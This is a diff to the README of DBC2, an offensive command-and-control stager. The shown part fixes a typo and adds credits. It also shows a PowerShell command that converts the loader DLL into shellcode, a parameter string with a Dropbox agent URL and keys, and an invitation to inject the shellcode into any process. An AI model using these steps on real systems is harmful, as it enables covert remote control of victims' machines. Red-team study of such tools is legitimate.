@@ -45,10 +45,18 @@ PS c:\> #x64 DLL
 PS c:\> ConvertTo-Shellcode -File release_x64\dbc2LoaderWrapperCLR_64.dll -UserData "<all required parameters for the dbc2Loader entryPoint function>" | Set-Content -Path dbc2LoaderWrapperCLR_x86.bin -Encoding Byte
 ```
 
-**IMPORTANT**: Using the ConvertTo-Shellcode.ps1 script, it is important to note that the dbc2Loader parameters must be passed in one single string with a `! separator, like for instance:
+**IMPORTANT**: Using the ConvertTo-Shellcode.ps1 script, it is important to note that the dbc2Loader parameters must be passed in one single string with a `!` separator, like for instance:
 `https://dropbox.com/path_to_dbc2_agent!xorkey!accessToken!masterkey`
 Those parameters are just like to one you would find in any other DBC2 stager.
 
 The resulting bin file are the shellcode that you're free to inject in any process using your prefered method.
 
 Have fun !
+
+Credits
+-------------
+Lee Christensen for creating and hosting the CLR in native code, then loading and executing a .Net assembly
+https://github.com/leechristensen/UnmanagedPowerShell
+
+Nick Landers for sRDI, used for transforming a native DLL to position independant shellcode 
+https://github.com/monoxgas/sRDI
